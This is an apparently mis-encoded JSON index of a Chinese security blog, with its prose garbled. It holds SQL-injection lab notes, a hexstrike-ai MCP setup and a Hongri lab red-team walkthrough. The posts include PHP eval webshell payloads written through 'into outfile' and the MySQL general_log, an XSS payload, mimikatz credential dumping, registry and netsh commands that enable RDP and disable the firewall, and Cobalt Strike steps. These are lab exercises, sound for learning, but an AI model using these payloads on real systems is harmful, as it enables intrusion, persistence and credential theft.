outfileå‘½ä»¤ä½¿ç”¨çš„ç¯å¢ƒï¼šå¿…é¡»çŸ¥é“ä¸€ä¸ªï¼ŒæœåŠ¡å™¨ä¸Šå¯ä»¥å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶å¤¹çš„å®Œæ•´è·¯å¾„ã€‚ less-7ä¸¤ä¸ªåŒå¼•å·ä¸æŠ¥é”™çš„åŸå› æ˜¯å› ä¸ºåŒå¼•å·è¢«ä¸¤ä¸ªå•å¼•å·é—­åˆï¼Œå¤±å»å•å¼•å·çš„ä½œç”¨æ˜¯å¦‚ä¸‹é—­åˆæ–¹å¼ 1?id=1')) æœ‰ä¸ªæ³•å­å¯ä»¥åˆ¤æ–­åˆ°åº•æ˜¯ä¸æ˜¯ä¸¤ä¸ªå•å¼•å·é—­åˆ 1?id=1'' and 1=2 --+ è¿™æ˜¾ç„¶æ˜¯ä¸æˆç«‹çš„ï¼Œä½†æ˜¯ä»»ç„¶ä¸æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°é‚£ä¹ˆè¿™å°±ä¸æ˜¯ä¸¤ä¸ªå•å¼•å·é—­åˆ 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\ben.php&quot;--+ &lt;?php@eval($_POST['password]);?&gt;ä¸ºä¸€å¥è¯æœ¨é©¬passwordä¸ºé¢„ç•™å¯†ç D:\\\\phpstudy._pro\\\\WWWW\\\\ä¸ºæ–‡ä»¶è·¯å¾„ben.phpä¸ºæ–°æ’å…¥çš„æ–‡ä»¶å 1?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\Soft\\\\Penetration\\\\TrafficTools\\\\phpStudy\\\\WWW\\\\ben.php&quot; --+ è¿™é‡Œå†™å¥½æ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç„¶åç”¨èšå‰‘è¿æ¥è¿™é‡Œè¿æ¥åœ°å€å°±æ˜¯ 1http://localhost/ben.php æŸ¥çœ‹æƒé™ï¼Œè¿™æ˜¯æœ¬æœºçš„ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ· linuxçš„è¯æ˜¯ 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&quot;,3 into outfile &quot;/var/www/heml/test/ben.php&quot;--+ ä¸Šä¼ å¤§é©¬åå¼¹æ‹¿web shell","link":"/2025/12/11/sql%E6%B3%A8%E5%85%A5/"},{"title":"","text":"hexstrike-ai kaliä½œä¸ºæœåŠ¡ç«¯ï¼ŒWindowsä½œä¸ºå®¢æˆ·ç«¯kaliçš„IPï¼š192.168.1.101 å¯åŠ¨hexstrlike-ai 12345cd /home/challenge/Desktop/hexstrike-aisource venv/bin/activatepython3 hexstrike_server.py å®¢æˆ·ç«¯å¯åŠ¨ 1python hexstrike_mcp.py --server http://192.168.1.101:8888 --debug traeçš„mcpé…ç½®æ–‡ä»¶ 123456789101112131415{ &quot;mcpServers&quot;: { &quot;hexstrike-ai&quot;: { &quot;command&quot;: &quot;D:\\\\env\\\\Python\\\\Python313\\\\python.exe&quot;, &quot;args&quot;: [ &quot;D:\\\\hexstrike-ai\\\\hexstrike_mcp.py&quot;, &quot;--server&quot;, &quot;http://192.168.1.101:8888&quot; ], &quot;description&quot;: &quot;HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform&quot;, &quot;timeout&quot;: 300, &quot;disabled&quot;: false } }} MCPè°ƒè¯•å·¥å…·å¯åŠ¨ï¼Œè¿™ä¸ªé»˜è®¤å¯åŠ¨æœ€æ–°ç‰ˆæœ¬ 1npx @modelcontextprotocol/inspector ç‚¹é“¾æ¥è¿›å…¥æµè§ˆå™¨ å¦‚ä¸‹æ‰€ç¤º Command 1D:\\env\\Python\\Python313\\python.exe Arguments 1D:\\\\hexstrike-ai\\\\hexstrike_mcp.py --server http://192.168.1.101:8888 ç„¶åå°±å¯ä»¥ç”¨è¿™ä¸ªé¡µé¢å»å¾®è°ƒMCPäº†åƒä¸€äº›ä»€ä¹ˆæç¤ºè¯ä¹‹ç±»çš„","link":"/2025/12/11/hexstrlike-ai/"},{"title":"","text":"çˆ¶å­åŸŸæ­å»º çˆ¶åŸŸï¼šsky0.com dcä¸»åŸŸæ§ï¼š192.168.64.11 pcæˆå‘˜åŸŸæ§ï¼š192.168.64.12 12345678910å­åŸŸï¼šhr.sky0.com dc:å­åŸŸæ§ 192.168.64.22 pcï¼šæˆå‘˜ä¸»æœº 192.168.139.23å­åŸŸï¼špc.sky0.com dc:å­åŸŸæ§ 192.168.64.33 pcï¼šæˆå‘˜ä¸»æœº 192.168.64.34 åŸŸæ—ï¼šga.sky0.com dc å­™å­åŸŸæ§ 192.168.64.36 pc æˆå‘˜ä¸»æœº 192.168.64.36 çˆ¶åŸŸï¼šsky.com dc å­åŸŸæ§ 192.168.64.44 pc æˆå‘˜ä¸»æœº 192.168.64.45","link":"/2025/12/11/%E7%88%B6%E5%AD%90%E5%9F%9F%E6%90%AD%E5%BB%BA/"},{"title":"","text":"çº¢æ—¥é¶åœºä¸€ çº¢æ—¥é¶åœºä¸€å…ˆæ‰«ç½‘æ®µ 1nmap -sn -PR -n 192.168.52.0/24 -sn: è·³è¿‡ç«¯å£æ‰«æï¼Œåªç¡®è®¤æ˜¯å¦åœ¨çº¿-PR: ä½¿ç”¨åŸºäº ARP åè®®çš„ä¸»æœºæ‰«æï¼Œå†…ç½‘é¦–é€‰-n: ä¸è¿›è¡Œåå‘ DNS è§£æï¼Œå¯æé«˜æ‰«æé€Ÿåº¦ ç„¶åæŒ‰çº§åˆ«åˆ°10æ‰«ç«¯å£ 1sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10 -sS: ä½¿ç”¨ TCP SYN åŠå¼€æ”¾æ‰«æ (å¿…é¡»ä½¿ç”¨ root æƒé™è¿è¡Œ)-sC: ä½¿ç”¨é»˜è®¤çš„è„šæœ¬æ‰«æï¼Œå¯æ‰«æå‡ºæ›´å¤šä¿¡æ¯ (æ¯”å¦‚ç½‘é¡µæ ‡é¢˜)-Pn: ä¸è¿›è¡Œæ´»è·ƒä¸»æœºæ‰«æï¼Œå› ä¸ºæ‰«æå¯¹è±¡å·²çŸ¥æ˜¯æ´»è·ƒä¸»æœº-n: ä¸è¿›è¡Œåå‘ DNS è§£æï¼Œæé«˜æ‰«æé€Ÿåº¦-sV: æ‰«ææœåŠ¡ç‰ˆæœ¬ä¿¡æ¯-p 1-65535: æŒ‡å®šæ‰«æçš„ç«¯å£èŒƒå›´ä¸ºæ‰€æœ‰ TCP ç«¯å£80ç«¯å£ ä»ä¸Šå›¾å¯çœ‹å‡º 192.168.52.10 ä¸»æœºå¼€æ”¾äº† 80 ç«¯å£ï¼Œè¿è¡Œäº† HTTP æœåŠ¡ï¼Œç«™ç‚¹æ ‡é¢˜ä¸º phpStudyï¼Œå³ä½¿ç”¨å°çš®é¢æ¿æ­å»ºçš„ web ç«™ç‚¹ã€‚æµè§ˆå™¨è®¿é—® http://192.168.1.10ï¼Œå¯ä»¥çœ‹åˆ° phpinfo.php æ–‡ä»¶è¢«å±•ç¤ºäº†å‡ºæ¥ï¼Œå¯è¢«æ”¶é›†åˆ°å¤§é‡ PHP é…ç½®ä¿¡æ¯ï¼š 2.1.3 ç«™ç‚¹ç›®å½•æ‰«æä½¿ç”¨ wfuzz æ¥æ‰«æ http://192.168.52.10/ çš„ç«™ç‚¹ç›®å½•ï¼š 1wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ -w /usr/share/wordlists/dirb/common.txt: æŒ‡å®š wfuzz ä½¿ç”¨ kali å†…ç½®çš„å¸¸è§ç›®å½•å’Œæ–‡ä»¶åå­—å…¸æ–‡ä»¶æ¥çˆ†ç ´--hc 404: hide code 404ï¼Œå³å½“è¿”å›çŠ¶æ€ç ä¸º 404 (æœªæ‰¾åˆ°) æ—¶ï¼Œwfuzz ä¸æ˜¾ç¤ºè¯¥ç»“æœ192.168.52.10/FUZZ: FUZZ ä¸ºå ä½ç¬¦ï¼Œå­—å…¸æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œéƒ½ä¼šæ›¿æ¢æ‰ FUZZï¼Œå¹¶å°†æ›¿æ¢åçš„ URL å‘é€ç»™æœåŠ¡å™¨ï¼Œç„¶ååˆ†ææœåŠ¡å™¨çš„ http çŠ¶æ€ç  /phpadminå¼±å¯†ç root.root 1wget http://192.168.52.10/beifen.rar è¿™é‡Œç›´æ¥å‘Šè¯‰æˆ‘ä»¬åå°åœ°å€äº†æºç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å› ä¸ºç›´æ¥æ‹¿æºç äº†å¤ªç®€å•äº†åœ¨ç•™è¨€æ¿/index.php?r=default/extend/index&amp;id=100023é¡µé¢è¾“å…¥ 12hello admin!!&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt; æ„æˆxss å•å‡»å®¡æ ¸æŒ‰é’®ï¼Œä½¿è¯¥ç•™è¨€é€šè¿‡å®¡æ ¸ä»è€Œæ˜¾ç¤ºåœ¨ç•™è¨€æ¿é¡µé¢ï¼šç„¶åç”¨æˆ·ç•Œé¢å°±ä¼šå¼¹çª—äº† yxcms åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç™»å½•åˆ° yxcms çš„åå°ï¼Œè¿›å…¥â€ å‰å°æ¨¡æ¿â€ï¼Œç®¡ç†æ¨¡æ¿æ–‡ä»¶å¹¶æ–°å»ºæ¨¡æ¿æ–‡ä»¶ï¼Œåç§°ä¸º hack, å†…å®¹ä¸º php ä¸€å¥è¯æœ¨é©¬: &lt;?php @eval($_POST['hack']);?&gt;: ä½†æ˜¯ä¸çŸ¥é“æ–‡ä»¶ä½ç½®è¿™é‡Œæˆ‘ä»¬ç›´æ¥å»ä½†æ˜¯æˆ‘ä»¬æœ‰æºç å¯ä»¥çŸ¥é“è¿™ä¸ªé¡µé¢å…¶ä»–æ–‡ä»¶çš„ä½ç½®yxcms\\protected\\apps\\default\\view\\default å¾—åˆ°æ–‡ä»¶è·¯å¾„ 1http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php ç„¶æˆ‘ä»¬ç›´æ¥å»antswordè¿æ¥ net sessionnet session å‘½ä»¤çš„æ ¸å¿ƒä½œç”¨æ˜¯å±•ç¤º â€œä¼šè¯è¿æ¥â€ï¼Œå…·ä½“èƒ½æŸ¥åˆ°ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š è¿œç¨‹è®¡ç®—æœºåç§° / IPï¼šæ˜¾ç¤ºå“ªä¸ªè®¾å¤‡ï¼ˆæ¯”å¦‚å¦ä¸€å°ç”µè„‘ã€æœåŠ¡å™¨ï¼‰æ­£åœ¨è¿æ¥ä½ çš„ç”µè„‘ã€‚ è¿æ¥ç±»å‹ï¼šé€šå¸¸æ˜¯ â€œMicrosoft Windows Networkâ€ï¼Œå³é€šè¿‡ Windows ç½‘ç»œå…±äº«å»ºç«‹çš„è¿æ¥ã€‚ è¿æ¥çŠ¶æ€ï¼šæ˜¾ç¤ºè¿æ¥æ˜¯ â€œå·²å»ºç«‹â€ è¿˜æ˜¯ â€œæ–­å¼€â€ ç­‰çŠ¶æ€ã€‚ ç™»å½•ç”¨æˆ·åï¼šæ˜¾ç¤ºè¿œç¨‹è®¾å¤‡ç”¨å“ªä¸ªè´¦å·ç™»å½•åˆ°ä½ çš„ç”µè„‘ï¼ˆä»…éƒ¨åˆ†åœºæ™¯æ˜¾ç¤ºï¼‰ã€‚ åˆ°phpadminè®¿é—®å†™ä¸€å¥è¯ 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot; INTO OUTFILE &quot;C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\hack.php&quot;; å‘½ä»¤æ‰§è¡Œåå‡ºç°äº†æŠ¥é”™ï¼Œæç¤º MySQL æœåŠ¡å™¨é…ç½®äº† secure-file-priv é€‰é¡¹ï¼Œé™åˆ¶äº†è¯¥å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢è¯¥é€‰é¡¹çš„çŠ¶æ€ï¼š 1SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;; ä»ä¸Šå›¾å¯çŸ¥ secure-file-priv é€‰é¡¹è¢«è®¾ç½®ä¸ºäº† NULL, MySQL æœåŠ¡å™¨ä¼šç¦æ­¢æ–‡ä»¶å¯¼å…¥ä¸å¯¼å‡ºåŠŸèƒ½ã€‚å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ secure-file-priv é€‰é¡¹çš„å€¼ä¸ºç©ºå­—ç¬¦ï¼Œä½¿å…¶ä¸åšç›®å½•é™åˆ¶: 1SET GLOBAL secure_file_priv = ''; ç°åœ¨è¯¥å˜é‡ä¸ºåªè¯»ï¼Œæ— æ³•ä¿®æ”¹å°è¯•ä» MySQL å‘½ä»¤æ‰§è¡Œæ—¥å¿—ä¸‹æ‰‹ï¼Œæ‰§è¡Œ SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;ï¼ŒæŸ¥çœ‹å‘½ä»¤æ‰§è¡Œæ—¥å¿—å¼€å…³å’Œæ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š 12SET GLOBAL general_log=on; SET GLOBAL general_log_file='C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php'; å‘½ä»¤æ‰§è¡Œä¼šè‡ªåŠ¨åœ¨å‘½ä»¤åé¢åŠ ä¸Šæ³¨é‡Šæç¤ºè¿”å›ç»“æœã€‚æ‰§è¡Œ SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;; æ‰‹åŠ¨éªŒè¯ä¸€ä¸‹ï¼š ä»ä¸Šå›¾å¯çŸ¥ä¿®æ”¹æˆåŠŸã€‚åé¢æ‰§è¡Œçš„æ‰€æœ‰ MySQL å‘½ä»¤éƒ½ä¼šè¢«è®°å½•åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ hack.php æ–‡ä»¶ä¸­ (åªè®°å½•å‘½ä»¤ï¼Œä¸è®°å½•ç»“æœ)ï¼Œæ­¤æ—¶å†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†ä¸€å¥è¯æœ¨é©¬è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼š 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot;; å†…ç½‘æ‰“é¶å…ˆä¼ csé©¬ğŸåˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶åç›´æ¥ç‚¹é¼ æ ‡å°±ææƒæˆåŠŸäº† è¿™é‡Œæˆ‘ä»¬æ¥çœ‹å¯†ç è¾“å…¥ 1logonpasswords å¾—åˆ°ä¸Šå›¾åç›´æ¥å»å°±å¾—åˆ°äº†å¯†ç ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° administrator ç”¨æˆ·çš„ç™»å½•å¯†ç ä¸º admin123!, æ‰€å±åŸŸä¸º god, å¯†ç æ¥æºä¸º mimikatz å·¥å…·ã€‚ æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æ§åˆ¶ (RDP) 3389 ç«¯å£æ˜¯å¦å¯ç”¨ï¼š 1shell netstat -ano | findstr 3389 è¾“å‡ºä¸ºç©ºè¡Œï¼Œè¯´æ˜æœªå¯ç”¨ï¼Œä½¿ç”¨æ­¤å‘½ä»¤å¼€å¯ RDPï¼š 1shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f æ“ä½œæˆåŠŸï¼Œå†æ¬¡æ‰§è¡Œ shell netstat -ano | findstr 3389 éªŒè¯ç»“æœï¼š å¯ç”¨æˆåŠŸã€‚WIN+R æ‰“å¼€è¿è¡Œçª—å£è¾“å…¥ mstsc.exe å›è½¦æ‰“å¼€ RDP å®¢æˆ·ç«¯ç¨‹åºï¼Œä½¿ç”¨ god/administrator ç”¨æˆ·è¿æ¥æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢ï¼šè¿™é‡Œæ˜¯GOD\\Administratorå‘ç°è¿æ¥å¤±è´¥ï¼Œnampæ‰«ä¸€ä¸‹ 1nmap -Pn -n -p 3389 192.168.52.10 å‘ç°ç«¯å£ä¸º filtered è¢«è¿‡æ»¤çŠ¶æ€ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨é˜²ç«å¢™æ‹¦æˆªï¼Œæ‰§è¡Œ shell netsh advfirewall show allprofiles å‘½ä»¤æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ï¼š ä»ä¸Šå›¾å¯çœ‹åˆ°é˜²ç«å¢™çŠ¶æ€ä¸ºæ‰“å¼€ä¸”æ‹¦æˆªäº†å…¥ç«™æ•°æ®ï¼Œæ‰§è¡Œ shell netsh advfirewall set allprofiles state off å‘½ä»¤å°è¯•å…³é—­æœåŠ¡å™¨çš„é˜²ç«å¢™ (æˆ–è€…æ‰§è¡Œæ­¤å‘½ä»¤å•ç‹¬æ”¾è¡Œ RDP æµé‡ netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389)ï¼š æ‰§è¡ŒæˆåŠŸï¼Œå†æ¬¡éªŒè¯é…ç½®ï¼šshell netsh advfirewall show allprofiles è¿æ¥æˆåŠŸï¼ŒåŒæ—¶è§‚å¯Ÿåˆ°æ¡Œé¢ (å·¦ä¸Šè§’) ä¸Šæœ‰ nmap åº”ç”¨ç¨‹åºã€‚ åœ¨ CS ä¸­æ‰§è¡Œ shell ipconfig ä»ä¸Šå›¾å¯çœ‹åˆ°æœåŠ¡å™¨é™¤äº†æœ‰å’Œå’Œæ”»å‡»æœºåŒç½‘æ®µçš„ 192.168.52.10/24 çš„å¤–ç½‘ IP ä»¥å¤–ï¼Œè¿˜æœ‰å†…ç½‘ IP192.168.52.143/24ã€‚ ç»§ç»­åœ¨ CS ä¸­ä½¿ç”¨æœåŠ¡å™¨è‡ªå¸¦çš„ nmap æ‰«æå†…ç½‘æœ‰å“ªäº›æ´»è·ƒä¸»æœºï¼šshell nmap -sn -PR -n 192.168.52.143/24ã€‚æ³¨æ„ï¼Œæ­¤å‘½ä»¤å¿…é¡»åœ¨ Administrator ç”¨æˆ·çš„ beacon æ§åˆ¶å°ä¸‹æ‰§è¡Œï¼Œåœ¨ System ç”¨æˆ·ä¸‹æ— æ³•æ‰§è¡Œï¼Œå› ä¸º System ç”¨æˆ·æ— æ³•æ­£ç¡®è¯»å–åˆ°ç¯å¢ƒå˜é‡ï¼Œé™¤éä½¿ç”¨å‘½ä»¤çš„å®Œæ•´è·¯å¾„æ¥æ‰§è¡Œï¼Œæ¯”å¦‚ shell &quot;C:\\Program Files (x86)\\Nmap\\nmap.exe&quot; -sn -PR -n 192.168.52.143/24: 1234567192.168.52.1192.168.52.141192.168.52.254192.168.52.2192.168.52.138192.168.52.10192.168.52.143 3.1.6 åŸŸæˆå‘˜èº«ä»½ç¡®å®šç”±äºå‰é¢å·²ç»ç¡®å®š Win7 æœåŠ¡å™¨æ‰€å±åŸŸä¸º god, å› æ­¤å¦å¤–ä¸¤å°æ´»è·ƒä¸»æœºä¸€å®šæœ‰ä¸€å°æ˜¯åŸŸæ§åˆ¶å™¨ DC, ä½¿ç”¨ net view å‘½ä»¤ (æ³¨æ„ä¸è¦åŠ  shell å‰ç¼€ï¼Œå¦åˆ™ç»“æœä¸å®Œæ•´) æ¢æµ‹åŸŸå†…ä¸»æœºï¼š 1net view ä»ä¸Šå›¾å¯çœ‹åˆ° 192.168.52.138 çš„ä¸»æœºåä¸º OWA(å…¨ç§°åº”è¯¥æ˜¯ Outlook Web App)ï¼Œä¸ºä¸»åŸŸæ§åˆ¶å™¨ PDC (Primary Domain Controller),192.168.52.141 çš„ä¸»æœºåä¸º ROOT-TVI862UBEH, å’Œ Win7 æœåŠ¡å™¨ä¸€æ ·åŒå±äº god åŸŸçš„åŸŸæˆå‘˜ã€‚ å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼ŒCS ä¼šè‡ªåŠ¨å°†æ¢æµ‹åˆ°çš„è®¾å¤‡åŠ å…¥â€ ç›®æ ‡åˆ—è¡¨â€(æ³¨æ„ï¼Œå›¾ä¸­çš„ 198.18.*.* ä¸ºæœ¬åœ°åŸºå‡†æµ‹è¯• IPï¼Œåœ¨è¿™é‡Œæ— å®é™…æ„ä¹‰ï¼Œä¸å¿…åœ¨æ„): 3.1.7 åŸŸæˆå‘˜ç«¯å£æ‰«æåœ¨ CS çš„ Administrator ç”¨æˆ·çš„ beacon æ§åˆ¶å°ä¸­ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹ä¸¤æ¡å‘½ä»¤æ¥åˆ†åˆ«æ‰«æ 192.168.52.138 å’Œ 192.168.52.141 ä¸¤å°ä¸»æœºçš„ç«¯å£çŠ¶æ€ï¼š 12shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138 shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141 ä»ä¸Šé¢ä¸¤å¼ å›¾ç‰‡ä¸­å¯ä»¥çœ‹å‡ºè¿™ä¸¤å°ä¸»æœºéƒ½å¼€æ”¾äº† SMB åè®®çš„ 445 ç«¯å£ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥å°è¯•ä½¿ç”¨ CS å†…ç½®çš„ psexec å·¥å…·è·å–ç›®æ ‡çš„ system shellã€‚ 3.2 æ¨ªå‘ç§»åŠ¨ åˆ›å»ºä¸€ä¸ª SMB ç›‘å¬å™¨ï¼Œåå­—ä¸º wxdxï¼ŒPayload ä¸º Beacon SMBï¼š","link":"/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"},{"title":"","text":"ä¿¡å‘¼OAæ–‡ä»¶ä¸Šä¼ ","link":"/2025/12/11/%E4%BF%A1%E5%91%BCOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[],"categories":[],"pages":[{"title":"","text":"google-site-verification: google0ce01516f2d5551f.html","link":"/static/google0ce01516f2d5551f.html"}]}